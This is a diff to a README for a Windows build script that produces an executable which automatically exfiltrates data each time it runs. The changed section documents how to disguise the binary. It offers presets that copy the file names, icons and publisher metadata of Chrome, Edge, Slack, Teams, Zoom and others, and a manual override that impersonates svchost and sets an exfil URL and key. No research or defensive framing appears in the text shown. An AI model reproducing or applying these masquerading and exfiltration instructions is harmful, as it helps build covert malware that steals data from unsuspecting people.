@@ -266,39 +266,41 @@ Follow the [Report Server](#report-server) deploy steps above. When done, `deplo
 
 Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces the exe in the repo root. The exe auto-exfils on every run — no flags needed on target.
 
-**Disguising the binary** — the build script controls the filename, process name (Task Manager), and the metadata shown in File Explorer Properties. Presets are included for common processes so the right company/description are auto-populated:
+**Disguising the binary** — use `-Preset` to pick a disguise, or run without arguments for an interactive menu:
 
 ```powershell
-# Default — blends into Chrome's existing process list
-.\build_windows.ps1
-# Produces: chrome_crashpad_handler.exe
-# Properties: Google LLC — Google Chrome
-
-.\build_windows.ps1 -ExeName RuntimeBroker
-# Produces: RuntimeBroker.exe
-# Properties: Microsoft Corporation — Runtime Broker
-
-.\build_windows.ps1 -ExeName MicrosoftEdgeUpdate
-.\build_windows.ps1 -ExeName OneDrive
-.\build_windows.ps1 -ExeName SearchIndexer
+.\build_windows.ps1           # interactive menu to pick a preset
+.\build_windows.ps1 -Preset chrome
+.\build_windows.ps1 -Preset slack
+.\build_windows.ps1 -Preset teams
 ```
 
-**Adding an icon** — pass any `.ico` or `.exe` to copy the icon from:
+Available presets (set exe name, process name, icon, and Properties metadata automatically):
 
-```powershell
-# Use Chrome's own icon (looks identical in Explorer)
-.\build_windows.ps1 -IconFile "C:\Program Files\Google\Chrome\Application\chrome.exe"
+| # | Preset | Exe name | Appears as |
+|---|--------|----------|------------|
+| 1 | `chrome` | `chrome_crashpad_handler.exe` | Google LLC — Google Chrome |
+| 2 | `edge` | `msedge_crashpad_handler.exe` | Microsoft Corporation — Microsoft Edge |
+| 3 | `brave` | `brave_crashpad_handler.exe` | Brave Software, Inc — Brave Browser |
+| 4 | `firefox` | `plugin-container.exe` | Mozilla Corporation — Mozilla Firefox |
+| 5 | `opera` | `opera_crashpad_handler.exe` | Opera Software AS — Opera internet browser |
+| 6 | `slack` | `slack.exe` | Slack Technologies, Inc. — Slack |
+| 7 | `discord` | `Discord.exe` | Discord Inc. — Discord |
+| 8 | `teams` | `ms-teams.exe` | Microsoft Corporation — Microsoft Teams |
+| 9 | `zoom` | `Zoom.exe` | Zoom Video Communications, Inc. — Zoom |
+| 10 | `whatsapp` | `WhatsApp.exe` | WhatsApp LLC — WhatsApp |
+| 11 | `telegram` | `Telegram.exe` | Telegram FZ-LLC — Telegram Desktop |
 
-# Use a custom .ico file
-.\build_windows.ps1 -ExeName RuntimeBroker -IconFile "C:\path\to\icon.ico"
-```
+Icons are pulled automatically from the app's install path if it's installed on the build machine. If the app isn't installed, the binary is built without a custom icon.
 
-**Full override example:**
+**Full manual override** (for any process name not in the presets):
 
 ```powershell
 .\build_windows.ps1 `
-    -ExeName MicrosoftEdgeUpdate `
-    -IconFile "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" `
+    -ExeName svchost `
+    -Company "Microsoft Corporation" `
+    -FileDesc "Host Process for Windows Services" `
+    -IconFile "C:\Windows\System32\svchost.exe" `
     -ExfilUrl https://reports.example.com `
     -ExfilKey mykey
 ```
